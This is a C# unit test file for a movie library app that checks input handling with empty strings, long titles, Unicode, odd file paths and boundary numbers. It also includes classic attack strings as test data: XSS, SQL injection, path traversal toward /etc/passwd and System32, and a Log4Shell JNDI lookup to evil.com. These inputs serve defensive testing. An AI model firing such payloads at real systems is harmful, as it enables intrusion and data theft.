using WatchMark.App.Models;

namespace WatchMark.Tests.Security;

public class InputValidationTests
{
    [Theory]
    [InlineData("")]
    [InlineData("   ")]
    [InlineData("\t")]
    [InlineData("\n")]
    public void FilterText_WithWhitespaceOrEmpty_HandledGracefully(string input)
    {
        // Arrange
        var movie = new MovieItem { Title = "Test Movie", FilePath = "test.mp4" };

        // Act - Simulate filter logic without full ViewModel
        var normalizedFilter = (input ?? string.Empty).Trim();
        var matches = movie.Title.Contains(normalizedFilter, StringComparison.OrdinalIgnoreCase);

        // Assert - Should not throw
        Assert.True(string.IsNullOrWhiteSpace(normalizedFilter) || !matches);
    }

    [Theory]
    [InlineData("<script>alert('xss')</script>")]
    [InlineData("'; DROP TABLE Movies; --")]
    [InlineData("../../etc/passwd")]
    [InlineData("${jndi:ldap://evil.com/a}")]
    [InlineData("%00")]
    public void FilterText_WithMaliciousInput_TreatedAsLiteralSearchString(string maliciousInput)
    {
        // Arrange
        var movie = new MovieItem { Title = maliciousInput, FilePath = "test.mp4" };

        // Act - Simulate filter logic
        var matches = movie.Title.Contains(maliciousInput, StringComparison.OrdinalIgnoreCase);

        // Assert - Should match as literal string without executing malicious code
        Assert.True(matches);
    }

    [Theory]
    [InlineData("C:\\..\\..\\Windows\\System32")]
    [InlineData("..\\..\\sensitive\\data")]
    [InlineData("/etc/../../../root")]
    [InlineData("\\\\malicious-server\\share")]
    public void LibraryPath_WithDangerousPath_ValidatedCorrectly(string dangerousPath)
    {
        // Act - Test path validation logic
        var isValid = Directory.Exists(dangerousPath);

        // Assert - Dangerous paths should either not exist or be normalized by Path.GetFullPath
        // The app should only scan if directory exists
        var normalizedPath = Path.GetFullPath(dangerousPath);
        Assert.NotNull(normalizedPath); // Should not throw
    }

    [Theory]
    [InlineData("movie'.mp4")]
    [InlineData("movie\".mp4")]
    [InlineData("movie;.mp4")]
    [InlineData("movie\0.mp4")]
    [InlineData("movie\r\n.mp4")]
    public void MovieItem_FilePath_WithSpecialCharacters_StoredSafely(string filePathWithSpecialChars)
    {
        // Arrange & Act
        var movie = new MovieItem
        {
            FilePath = filePathWithSpecialChars,
            Title = "Test Movie",
            ProgressPercent = 50.0
        };

        // Assert - Should store without issues
        Assert.Equal(filePathWithSpecialChars, movie.FilePath);
    }

    [Fact]
    public void MovieItem_ProgressPercent_BoundaryValues_HandledSafely()
    {
        // Arrange & Act
        var testCases = new[]
        {
            double.MinValue,
            -999999,
            -1,
            0,
            50.5,
            100,
            101,
            999999,
            double.MaxValue,
            double.NaN,
            double.PositiveInfinity,
            double.NegativeInfinity
        };

        // Assert - All should be assignable without crashes
        foreach (var value in testCases)
        {
            var movie = new MovieItem { ProgressPercent = value };
            Assert.Equal(value, movie.ProgressPercent);
        }
    }

    public static IEnumerable<object[]> LongTitles =>
    [
        [new string('A', 10000)],
        [new string('X', 100000)]
    ];

    [Theory]
    [MemberData(nameof(LongTitles))]
    public void MovieItem_Title_ExtremelyLongString_HandledWithoutCrash(string longTitle)
    {
        // Arrange & Act
        var movie = new MovieItem { Title = longTitle };

        // Assert - Should handle long strings without memory issues
        Assert.Equal(longTitle.Length, movie.Title.Length);
    }

    [Fact]
    public void FilterText_UnicodeAndEmoji_HandledCorrectly()
    {
        // Arrange
        var movies = new List<MovieItem>
        {
            new MovieItem { Title = "Movie 🎬 2023", FilePath = "test.mp4" },
            new MovieItem { Title = "电影名称", FilePath = "test2.mp4" },
            new MovieItem { Title = "Фильм", FilePath = "test3.mp4" }
        };

        // Act - Simulate filtering
        var filterText = "🎬";
        var filtered = movies.Where(m => m.Title.Contains(filterText, StringComparison.OrdinalIgnoreCase)).ToList();

        // Assert
        Assert.Single(filtered);
        Assert.Contains("🎬", filtered[0].Title);
    }

    [Theory]
    [InlineData("\\\\?\\C:\\very\\long\\path")]
    [InlineData("\\\\?\\UNC\\server\\share")]
    [InlineData("\\\\.\\PhysicalDrive0")]
    public void LibraryPath_WindowsSpecialPaths_HandledSafely(string specialPath)
    {
        // Act - Test that Path.GetFullPath handles these without crashes
        try
        {
            var normalized = Path.GetFullPath(specialPath);
            Assert.NotNull(normalized);
        }
        catch (Exception ex)
        {
            // Some special paths may throw - this is expected and safe
            Assert.True(ex is ArgumentException || ex is NotSupportedException);
        }
    }
}
